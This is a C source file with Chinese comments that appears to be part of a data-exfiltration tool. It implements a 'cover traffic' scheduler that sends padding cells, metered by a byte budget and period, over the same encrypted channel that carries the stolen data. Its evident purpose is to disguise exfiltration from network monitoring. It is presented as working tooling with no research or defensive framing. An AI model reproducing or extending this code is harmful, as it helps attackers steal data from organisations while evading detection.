/* task_cover.c — 任务通道的覆盖流量维持 */
#include "exfil_task_cover.h"
#include "exfil_task_link.h"
#include "p2p_cell.h"

#include <string.h>

const char *exfil_task_cover_errstr(int e) {
    switch (e) {
        case EXF_TASK_COVER_OK:      return "ok";
        case EXF_TASK_COVER_ERR_ARG: return "invalid argument";
        case EXF_TASK_COVER_ERR_IO:  return "write failed";
        default:                     return "unknown";
    }
}

int exfil_task_cover_init(exfil_task_cover_t *tc, uint32_t profile,
                          uint32_t budget_bpm, uint32_t period_ms,
                          uint32_t now_ms) {
    if (!tc) return EXF_TASK_COVER_ERR_ARG;

    memset(tc, 0, sizeof(*tc));
    tc->period_ms  = period_ms ? period_ms : EXF_TASK_COVER_PERIOD_MS;
    tc->budget_bpm = budget_bpm;
    tc->last_ms    = now_ms;

    /* p2p_cover 内部以微秒计时，此处统一由注入的毫秒换算 */
    if (p2p_cover_init(&tc->cov, profile, budget_bpm,
                       (uint64_t)now_ms * 1000ull) != P2P_COVER_OK)
        return EXF_TASK_COVER_ERR_ARG;

    tc->inited = 1;
    return EXF_TASK_COVER_OK;
}

int exfil_task_cover_set_profile(exfil_task_cover_t *tc, uint32_t profile) {
    if (!tc || !tc->inited) return EXF_TASK_COVER_ERR_ARG;
    return (p2p_cover_set_profile(&tc->cov, profile) == P2P_COVER_OK)
               ? EXF_TASK_COVER_OK : EXF_TASK_COVER_ERR_ARG;
}

int exfil_task_cover_set_cost(exfil_task_cover_t *tc, uint32_t bytes_per_cell) {
    if (!tc || !tc->inited) return EXF_TASK_COVER_ERR_ARG;
    return (p2p_cover_set_measured_cost(&tc->cov, bytes_per_cell) == P2P_COVER_OK)
               ? EXF_TASK_COVER_OK : EXF_TASK_COVER_ERR_ARG;
}

int exfil_task_cover_set_budget(exfil_task_cover_t *tc, uint32_t budget_bpm) {
    if (!tc || !tc->inited) return EXF_TASK_COVER_ERR_ARG;
    if (p2p_cover_set_budget(&tc->cov, budget_bpm) != P2P_COVER_OK)
        return EXF_TASK_COVER_ERR_ARG;
    tc->budget_bpm = budget_bpm;
    return EXF_TASK_COVER_OK;
}

int exfil_task_cover_set_bounds(exfil_task_cover_t *tc, uint32_t min_per_min,
                                uint32_t max_per_min) {
    if (!tc || !tc->inited) return EXF_TASK_COVER_ERR_ARG;
    return (p2p_cover_set_bounds(&tc->cov, min_per_min, max_per_min) == P2P_COVER_OK)
               ? EXF_TASK_COVER_OK : EXF_TASK_COVER_ERR_ARG;
}

uint32_t exfil_task_cover_rate(const exfil_task_cover_t *tc) {
    if (!tc || !tc->inited) return 0;
    return p2p_cover_rate((p2p_cover_t *)&tc->cov);
}

uint32_t exfil_task_cover_projected_bpm(const exfil_task_cover_t *tc) {
    if (!tc || !tc->inited) return 0;
    return p2p_cover_projected_bytes_per_min((p2p_cover_t *)&tc->cov);
}

int exfil_task_cover_burst(exfil_task_chan_t *ch, exfil_task_cover_t *tc,
                           int fd) {
    if (!ch || !tc || !tc->inited || fd < 0) return EXF_TASK_COVER_ERR_ARG;

    if (exfil_task_chan_cover(ch, fd) != EXF_TASK_OK)
        return EXF_TASK_COVER_ERR_IO;

    tc->cover_sent++;
    return EXF_TASK_COVER_OK;
}

int exfil_task_cover_tick(exfil_task_chan_t *ch, exfil_task_cover_t *tc,
                          int fd, uint32_t now_ms, size_t *out_cover) {
    if (!ch || !tc || !tc->inited || fd < 0) return EXF_TASK_COVER_ERR_ARG;
    if (out_cover) *out_cover = 0;

    /* 预算为 0 = 明确禁用覆盖，保持静默（不做余量累积） */
    if (tc->budget_bpm == 0) {
        uint32_t dummy = 0;
        (void)p2p_cover_take_due(&tc->cov, 0, &dummy);
        tc->last_ms = now_ms;
        return EXF_TASK_COVER_OK;
    }

    /* 无符号减法：now_ms 回绕（2^32ms ≈ 49 天）仍然得到正确的间隔 */
    uint32_t elapsed = now_ms - tc->last_ms;
    if (elapsed < tc->period_ms) return EXF_TASK_COVER_OK;

    uint32_t n = 0;
    if (p2p_cover_take_due(&tc->cov, elapsed, &n) != P2P_COVER_OK)
        return EXF_TASK_COVER_ERR_ARG;
    tc->last_ms = now_ms;

    if (n > EXF_TASK_COVER_MAX_TICK) n = EXF_TASK_COVER_MAX_TICK;

    for (uint32_t i = 0; i < n; i++) {
        /* 覆盖与数据共用 &ch->cell —— 硬规则 1，不得另起上下文 */
        if (exfil_task_chan_cover(ch, fd) != EXF_TASK_OK)
            return EXF_TASK_COVER_ERR_IO;
    }

    tc->cover_sent += n;
    if (out_cover) *out_cover = (size_t)n;
    return EXF_TASK_COVER_OK;
}

void exfil_task_cover_wipe(exfil_task_cover_t *tc) {
    if (!tc) return;
    /*
     * p2p_cover 没有独立的 wipe 入口；整体 memset 即可。
     * 本结构不含密钥材料（密钥在 exfil_task_chan_t 里，由
     * exfil_task_chan_wipe 负责），故此处无需 secure_zero。
     */
    memset(tc, 0, sizeof(*tc));
}
